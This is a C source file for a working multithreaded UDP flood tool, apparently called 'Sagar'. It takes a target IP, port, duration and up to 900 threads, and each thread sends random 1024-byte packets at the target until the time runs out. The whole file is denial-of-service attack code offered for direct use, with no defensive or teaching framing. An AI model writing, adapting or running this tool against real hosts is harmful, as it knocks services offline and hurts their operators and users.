#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define PAYLOAD_SIZE 1024  // Larger payload size
#define NUM_PAYLOADS 100   // Number of unique payloads
#define MAX_THREADS 900    // Maximum number of threads

void usage() {
    printf("Usage: ./Sagar <ip> <port> <time> <threads>\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration; // Renamed from 'time' to avoid conflict
};

// Function to generate a random payload
void generate_payload(char *payload, size_t size) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < size - 1; i++) {
        payload[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    payload[size - 1] = '\0';  // Null-terminate the payload
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    char payload[PAYLOAD_SIZE];

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->duration;

    // Send payloads in a loop
    while (time(NULL) <= endtime) {
        generate_payload(payload, PAYLOAD_SIZE);  // Generate a new payload
        if (sendto(sock, payload, PAYLOAD_SIZE, 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]); // Renamed variable
    int threads = atoi(argv[4]);

    if (threads > MAX_THREADS) {
        printf("Error: Maximum threads allowed is %d\n", MAX_THREADS);
        exit(1);
    }

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    printf("Enhanced flood started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    // Seed the random number generator
    srand(time(NULL)); // Now refers to the function, not a variable

    // Launch threads
    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->duration = duration; // Updated member name

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}